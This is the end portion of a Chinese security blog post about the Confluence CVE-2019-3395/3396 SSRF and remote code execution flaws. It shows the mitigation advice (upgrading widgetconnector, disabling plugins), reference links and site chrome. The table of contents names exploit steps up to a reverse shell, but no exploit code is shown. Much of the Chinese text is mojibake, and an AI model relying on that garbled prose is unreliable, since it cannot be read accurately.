+<p>����ǰwidgetconnector-*.jar�ļ��滻Ϊ��ȫ�汾�������������£�<br><a href="https://packages.atlassian.com/maven-public/com/atlassian/confluence/extra/widgetconnector/widgetconnector/3.1.4/widgetconnector-3.1.4.jar" target="_blank" rel="noopener">https://packages.atlassian.com/maven-public/com/atlassian/confluence/extra/widgetconnector/widgetconnector/3.1.4/widgetconnector-3.1.4.jar</a></p>
+<p>�������񣬼�������޸���</p>
+<p><strong>���ò���ȫ���</strong><br>����ʱ�������������޸��汾��Ҳ�ɵ�������á� -&gt;Manage apps/add-onsѡ��System��������Confluence������á�</p>
+<p>WebDAV plugin<br>Widget Connector</p>
+<p>ע��</p>
+<p>������Widget Connector����� Widget Connector ָ������ã���ָ��������չʾYouTube��Vimeo��������վ���ݵģ����ø�ָ����û����ܻ�������unknown macro������<br>������WebDAV��������޷�ʹ��WebDAV�ͻ���������Confluence�����ô˲��Ҳ���Զ�����Office Connector�����</p>
+<p>��������������ֶ��������в����</p>
+<p>WebDAV plugin<br>Widget Connector<br>Office Connector</p>
+<h1 id="�ο����ӣ�"><a href="#�ο����ӣ�" class="headerlink" title="�ο����ӣ�"></a>�ο����ӣ�</h1><p><a href="http://blog.nsfocus.net/confluence-ssrf/" target="_blank" rel="noopener">http://blog.nsfocus.net/confluence-ssrf/</a><br><a href="https://www.jianshu.com/p/75d92d83c6c4" target="_blank" rel="noopener">https://www.jianshu.com/p/75d92d83c6c4</a>  ��ˮ����</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://zhaijiahui.github.io">zhaijiahui</a>
+            <p>原文链接：<a href="https://zhaijiahui.github.io/2019/06/06/Confluence_CVE20193396/">https://zhaijiahui.github.io/2019/06/06/Confluence_CVE20193396/</a>
+            <p>发表日期：<a href="https://zhaijiahui.github.io/2019/06/06/Confluence_CVE20193396/">June 6th 2019, 2:22:18 pm</a>
+            <p>更新日期：<a href="https://zhaijiahui.github.io/2019/06/06/Confluence_CVE20193396/">June 6th 2019, 2:47:33 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/05/09/openvpn服务端安装/" title= "Ubuntu 18.04 下搭建openvpn">
+                    <div class="prevTitle">Ubuntu 18.04 下搭建openvpn</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:826806614@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/zhaijiahui" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Confluence-SSRF��Զ�̴���ִ��©����CVE-2019-3395-CVE-2019-3396"><span class="toc-number">1.</span> <span class="toc-text">Confluence SSRF��Զ�̴���ִ��©����CVE-2019-3395\CVE-2019-3396)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#©������"><span class="toc-number">1.1.</span> <span class="toc-text">©������</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-3395-WebDAV"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2019-3395 WebDAV</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-3396-Widget-Connector"><span class="toc-number">1.3.</span> <span class="toc-text">CVE-2019-3396 Widget Connector</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#©������-1"><span class="toc-number">1.4.</span> <span class="toc-text">©������</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-�l�����"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.�ļ�����</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-��ȡ��j�u���·��"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.��ȡ��ǰ�û���·��</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-����ִ��"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.����ִ��</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-����shell"><span class="toc-number">1.4.4.</span> <span class="toc-text">4.����shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-����"><span class="toc-number">1.4.5.</span> <span class="toc-text">5.����</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#�޸�����"><span class="toc-number">2.</span> <span class="toc-text">�޸�����</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#�ο����ӣ�"><span class="toc-number">3.</span> <span class="toc-text">�ο����ӣ�</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 11
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span><a class="archive-post-title" href= "/2019/06/06/Confluence_CVE20193396/" >Confluence-CVE20193396</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2019/05/09/openvpn服务端安装/" >Ubuntu 18.04 下搭建openvpn</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/08</span><a class="archive-post-title" href= "/2019/05/08/shadowsocks服务端安装/" >Ubuntu 16.04 下 Shadowsocks服务器端安装及优化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2019/03/12/ecshop273/" >ECShop 2.7.3 SQL注入/代码执行漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/28</span><a class="archive-post-title" href= "/2019/01/28/upload-labs/" >Upload-lab 练习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/2018/10/08/PHP常见函数/" >PHP常见函数总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/07</span><a class="archive-post-title" href= "/2018/10/07/hexo的一些常规操作/" >Hexo的一些常规操作</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/07</span><a class="archive-post-title" href= "/2018/10/07/几个不错的hexo主题/" >几个不错的hexo主题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/28</span><a class="archive-post-title" href= "/2018/09/28/在github上搭建个人网站/" >在Github上搭建个人网站</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2018/08/21/JAWS/" >网络摄像头的安全问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2018/06/01/IDscan/" >IDscan 敏感文件扫描器</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="TOOLS"><span class="iconfont-archer">&#xe606;</span>TOOLS</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="NOTE"><span class="iconfont-archer">&#xe606;</span>NOTE</span>
+    
+        <span class="sidebar-tag-name" data-tags="Confluence"><span class="iconfont-archer">&#xe606;</span>Confluence</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="脚本工具"><span class="iconfont-archer">&#xe60a;</span>脚本工具</span>
+    
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
+    
+        <span class="sidebar-category-name" data-categories="Hexo"><span class="iconfont-archer">&#xe60a;</span>Hexo</span>
+    
+        <span class="sidebar-category-name" data-categories="Shadowsocks"><span class="iconfont-archer">&#xe60a;</span>Shadowsocks</span>
+    
+        <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "zhaijiahui"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
